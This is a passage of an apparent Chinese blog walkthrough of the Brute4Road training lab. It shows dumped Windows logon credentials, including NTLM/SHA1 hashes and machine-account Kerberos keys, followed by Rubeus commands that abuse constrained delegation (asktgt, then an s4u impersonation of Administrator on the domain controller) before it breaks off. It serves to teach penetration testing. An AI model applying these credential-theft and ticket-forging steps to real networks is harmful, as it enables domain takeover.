<span class="token keyword">from</span> 0User Name         : MSSQLSERVER14Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1017        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER14         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 7c8553b614055d945f8b8c3cf8eae789         <span class="token operator">*</span> SHA1     : 1efdc2efed20ca503bdefea5aef8aa0ea04c257b        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER14         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER14         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208441 <span class="token punctuation">(</span>00000000:00032e39<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER10Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1013        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER10         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : c3e7aa593081ae1b210547da7d46819b         <span class="token operator">*</span> SHA1     : 3bf20cfece021438cf86617f5cabc5e7a69038f7        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER10         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER10         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208350 <span class="token punctuation">(</span>00000000:00032dde<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER09Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1012        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER09         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 2dd7fe93426175a9ff3fa928bcf0eb77         <span class="token operator">*</span> SHA1     : a34c0482568fc9329f33ccdc1852fab9ef65bcd1        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER09         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER09         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 208174 <span class="token punctuation">(</span>00000000:00032d2e<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER07Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1010        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER07         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : f9f990df1bc869cc205d2513b788a5b8         <span class="token operator">*</span> SHA1     : 79746cfe5a2f1eec4350a6b64d87b01455ef9030        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER07         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER07         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 207945 <span class="token punctuation">(</span>00000000:00032c49<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER05Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1008        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER05         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : b552da4a7f732c40ca73c01dfaea7ebc         <span class="token operator">*</span> SHA1     : 7f041a31e763eed45fb881c7f77831b888c3051d        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER05         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER05         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 207620 <span class="token punctuation">(</span>00000000:00032b04<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER02Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1005        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER02         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : 3aa518732551a136003ea41f9599a1ec         <span class="token operator">*</span> SHA1     : 6f1ed1f677201d998667bd8e3b81cfb52b9a138a        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER02         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER02         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 207505 <span class="token punctuation">(</span>00000000:00032a91<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 0User Name         : MSSQLSERVER01Domain            : MSSQLSERVERLogon Server      : MSSQLSERVERLogon Time        : 2025/2/24 23:14:45SID               : S-1-5-21-1403470932-1755135066-2609122076-1004        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER01         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> NTLM     : ded5ad90b3d8560838a777039641c673         <span class="token operator">*</span> SHA1     : a2cd9d2963f29b162847e8a1a2c19d5e0641a162        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER01         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER01         <span class="token operator">*</span> Domain   : MSSQLSERVER         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 95411 <span class="token punctuation">(</span>00000000:000174b3<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : SSASTELEMETRYDomain            : NT ServiceLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:32SID               : S-1-5-80-1549978933-2891762758-2075524219-3728768389-1145206490        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 93540 <span class="token punctuation">(</span>00000000:00016d64<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : SQLTELEMETRYDomain            : NT ServiceLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:31SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 91986 <span class="token punctuation">(</span>00000000:00016752<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : ReportServerDomain            : NT ServiceLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:31SID               : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 997 <span class="token punctuation">(</span>00000000:000003e5<span class="token punctuation">)</span>Session           : Service <span class="token keyword">from</span> 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:30SID               : S-1-5-19        msv :        tspkg :        wdigest :         <span class="token operator">*</span> Username : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         <span class="token operator">*</span> Domain   : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         <span class="token operator">*</span> Domain   : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 63620 <span class="token punctuation">(</span>00000000:0000f884<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:30SID               : S-1-5-90-0-1        msv :         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> NTLM     : 7fa2072ba3c4eaf6713d45095efd01ef         <span class="token operator">*</span> SHA1     : 0ce43b9ebfc7525c2b2a43db53845bd7a0120877        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :Authentication Id : 0 <span class="token punctuation">;</span> 999 <span class="token punctuation">(</span>00000000:000003e7<span class="token punctuation">)</span>Session           : UndefinedLogonType <span class="token keyword">from</span> 0User Name         : MSSQLSERVER$Domain            : XIAORANGLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 23:14:15SID               : S-1-5-18        msv :        tspkg :        wdigest :         <span class="token operator">*</span> Username : MSSQLSERVER$         <span class="token operator">*</span> Domain   : XIAORANG         <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>        kerberos :         <span class="token operator">*</span> Username : mssqlserver$         <span class="token operator">*</span> Domain   : XIAORANG<span class="token punctuation">.</span>LAB         <span class="token operator">*</span> Password : 08 87 42 1a 98 67 4c 81 76 11 c2 54 00 8b 81 6d a8 36 24 06 cb 8d 80 a3 66 a7 c9 0a 3c 59 33 b5 2b e6 b4 7a 46 a6 cb 8d 3d 4a c7 dc 15 80 24 bd f5 6f 91 24 db df be <span class="token function">ac</span> 2f dd 2f 2e 01 79 15 68 b2 d7 c0 be e8 d6 76 28 55 d2 0a 21 35 8d c8 e5 ab 0f a2 d5 34 08 df b0 85 d2 ed 5b ce d8 37 45 78 68 4f 84 56 4f b8 bd 6b 38 9e 0f 55 47 91 9d 3d ad 4a 5b 69 3f ef 2e af 06 91 87 ef da d2 de 1d 46 ed a7 37 b1 8e 99 14 <span class="token function">ac</span> d9 08 8b 52 f7 0b 7d 70 39 cd 16 1e 0e d0 20 71 02 86 60 9b 82 c3 5c bb 99 9a 3e e7 81 9b de fe 70 5f cc 9f 94 a7 5c 2a 69 87 60 13 02 1d 72 4a cc eb ee d9 8b c6 44 d1 0f c1 9e 14 87 45 e8 bc 24 44 b7 6e 1d ff 2d ed 60 89 22 <span class="token function">fc</span> b9 08 a4 28 3f 68 11 e6 fb ca ff 3e 0f b9 47 8b f1 0e 05 3b 14 8f 0c 58 ad a4        ssp :        credman :<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>翻一翻可以看到<code>MSSQLSERVER$</code>这个用户，MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控，并且似乎只有他的NTLM哈希可用，我们用Rubeus申请访问自身的服务票据</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe asktgt <span class="token operator">/</span>user:MSSQLSERVER$ <span class="token operator">/</span>rc4:7fa2072ba3c4eaf6713d45095efd01ef <span class="token operator">/</span>domain:xiaorang<span class="token punctuation">.</span>lab <span class="token operator">/</span>dc:DC<span class="token punctuation">.</span>xiaorang<span class="token punctuation">.</span>lab <span class="token operator">/</span>nowrap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225022430955.png" alt="image-20250225022430955"></p><p>抓到后注入票据</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>impersonateuser:Administrator <span class="token operator">/</span>msdsspn:CIFS/DC<span class="token punctuation">.</span>xiaorang<span class="token punctuation">.</span>lab <span class="token operator">/</span>dc:DC<span class="token punctuation">.</span>xiaorang<span class="token punctuation">.</span>lab <span class="token operator">/</span>ptt <span class="token 